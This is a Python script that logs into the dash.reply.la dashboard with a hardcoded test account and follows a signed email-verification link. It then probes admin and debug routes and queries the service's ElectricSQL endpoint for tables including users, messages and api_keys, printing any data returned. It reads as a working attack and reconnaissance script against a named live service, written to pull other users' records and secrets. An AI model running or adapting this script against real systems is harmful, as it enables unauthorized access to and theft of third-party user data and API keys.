import requests, re, json

s = requests.Session()
s.headers.update({"User-Agent": "Mozilla/5.0"})

# Login
r = s.get("https://dash.reply.la/login", timeout=15)
csrf = re.search(r'csrf-token" content="([^"]+)"', r.text).group(1)
s.post("https://dash.reply.la/login",
    data={"_token": csrf, "email": "final2nxaqg4rgnq@web-library.net", "password": "TestPass789!", "remember": "1"},
    allow_redirects=True, timeout=15)

# Click verify URL
vu = "https://dash.reply.la/verify-email/2816/55ef6e7135ba817f98f117fcfcd436cfbe01e398?expires=1784279058&signature=1802f4d7507b00b34da376621653245ee920b9dd36a84d7162fcad533f8e6c1c"
r2 = s.get(vu, timeout=15, allow_redirects=False)
print("Verify: " + str(r2.status_code) + " loc=" + r2.headers.get("Location", "-"))

if r2.is_redirect:
    r3 = s.get(r2.headers["Location"], timeout=15, allow_redirects=True)
    print("Dashboard: " + r3.url)

# Final dashboard check
r5 = s.get("https://dash.reply.la/dashboard", headers={"X-Inertia": "true"}, timeout=10)
print("\nDashboard: " + str(r5.status_code))

if r5.status_code == 200:
    m_dp = re.search(r'data-page=\\({(.+?)}\\)', r5.text, re.DOTALL)
    if m_dp:
        pg = json.loads(m_dp.group(1).replace('&quot;', '"'))
        user = pg.get("props",{}).get("auth",{}).get("user",{})
        print("*** FULLY AUTHENTICATED ***")
        print("User ID: " + str(user.get("id")))
        print("Verified at: " + str(user.get("email_verified_at")))
        print("Component: " + str(pg.get("component")))
        print("Org ID: " + str(pg.get("props",{}).get("currentOrganizationId")))
        print("Permissions: " + str(len(pg.get("props",{}).get("currentOrganizationPermissions",[]))))
        
        # Admin routes
        print("\n=== ADMIN ROUTES ===")
        for path in ["/admin/dashboard", "/settings/api", "/admin/organizations",
                     "/devlogin", "/horizon", "/telescope", "/admin/users",
                     "/admin/plans", "/admin/subscriptions", "/settings/profile",
                     "/chatbots", "/contacts", "/organizations"]:
            r6 = s.get("https://dash.reply.la" + path, headers={"X-Inertia": "true"}, timeout=10)
            if r6.status_code == 200 and "login" not in r6.url.lower():
                mc = re.search(r'"component":"([^"]+)"', r6.text)
                comp = mc.group(1) if mc else str(len(r6.text)) + "b"
                print("  [+] " + path + ": " + comp)
            else:
                print("  [-] " + path + ": " + str(r6.status_code))
        
        # ElectricSQL
        print("\n=== ELECTRIC SQL ===")
        for table in ["users", "organizations", "chatbots", "contacts", "messages", "api_keys"]:
            r7 = s.get("https://service-rt.reply.la/v1/shape?table=" + table + "&offset=-1",
                headers={"Accept": "application/json", "Origin": "https://dash.reply.la"}, timeout=10)
            if r7.status_code == 200:
                sz = len(r7.text)
                if sz > 100:
                    print("  [+] " + table + ": " + str(sz) + " bytes")
                    print("    " + r7.text[:400])
                else:
                    print("  [~] " + table + ": empty")
            else:
                print("  [-] " + table + ": " + str(r7.status_code) + " " + r7.text[:60])
else:
    print("Blocked: " + str(r5.status_code))
    if r5.status_code == 409:
        m_dp = re.search(r'data-page=\\({(.+?)}\\)', r5.text, re.DOTALL)
        if m_dp:
            pg = json.loads(m_dp.group(1).replace('&quot;', '"'))
            user = pg.get("props",{}).get("auth",{}).get("user",{})
            print("User ID: " + str(user.get("id")))
            print("Verified: " + str(user.get("email_verified_at")))
